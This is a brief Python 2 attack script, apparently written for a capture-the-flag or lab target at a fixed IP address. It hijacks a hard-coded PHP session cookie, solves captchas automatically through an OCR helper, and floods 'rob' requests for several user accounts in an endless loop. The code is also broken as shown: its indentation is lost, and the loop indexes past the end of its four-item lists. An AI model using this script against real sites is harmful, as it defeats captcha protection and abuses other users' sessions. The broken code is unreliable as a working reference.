# -*- coding: utf_8 -*-
from recog import getCODE
import requests
import sys,os,time
import re
from time import *
u1 = "http://106.75.30.59:8888/rob.php?id="
url = "http://106.75.30.59:8888/dorob.php"
pic_url = "http://106.75.30.59:8888/code.php"
HEAD = {
'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
'Cookie':'PHPSESSID=o3nrs1n4d1tob9t82fgj25j000'
}
def get_vcode(vcode):
while True :
f = open(vcode,'w')
f.write(r.get(pic_url,headers=HEAD).content)
f.close()
v = getCODE(vcode)
if len(v) == 4: return v
def getRes(user,u):
r.get(u,headers=HEAD)
vcode = get_vcode('tmp.jpg')
payload = {
'user':user,
'CheckCode':vcode,
'num':'1'
}
print r.post(url,data = payload,headers = HEAD).content
user = ['abc123','testluo','tuhao10','wintersun']
ID = [9,98,368,471]
while True:
for i in xrange(5):
r = requests.session()
getRes(user[i],u1+str(ID[i]))
sleep(1)
